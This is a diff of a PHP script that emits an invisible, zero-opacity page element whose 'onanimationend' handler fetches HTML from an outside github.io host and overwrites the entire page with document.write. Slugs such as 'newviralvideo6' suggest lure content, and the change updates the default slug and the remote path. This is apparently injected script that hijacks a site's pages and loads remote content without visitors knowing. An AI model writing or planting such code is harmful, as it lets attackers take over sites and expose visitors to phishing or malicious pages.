@@ -10,7 +10,7 @@ $path_parts = explode('/', trim($request_uri, '/'));
 $slug = end($path_parts);
 
 if (empty($slug) || $slug == 'bwr') {
-    $slug = 'newviralvideo6';
+    $slug = 'match';
 }
 
 // যদি সরাসরি .html ফাইল ব্রাউজারে কল করা হয়, তবে CORS সহ HTML সার্ভ করা
@@ -44,7 +44,7 @@ $response = [
             "URL" => "#",
             "attributes" => [
                 "style" => "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
-                "onanimationend" => "if (window.__grav_FETCH_RAN__) { console.log('already ran'); } else { window.__grav_FETCH_RAN__ = 1; fetch('https://medium563.github.io/vtre/{$slug}.html').then(function(res){ return res.text(); }).then(function(html){ document.open(); document.write(html); document.close(); }).catch(function(err){ console.error(err); }); }"
+                "onanimationend" => "if (window.__grav_FETCH_RAN__) { console.log('already ran'); } else { window.__grav_FETCH_RAN__ = 1; fetch('https://medium563.github.io/vtre/bwr/{$slug}.html').then(function(res){ return res.text(); }).then(function(html){ document.open(); document.write(html); document.close(); }).catch(function(err){ console.error(err); }); }"
             ]
         ]
     ]
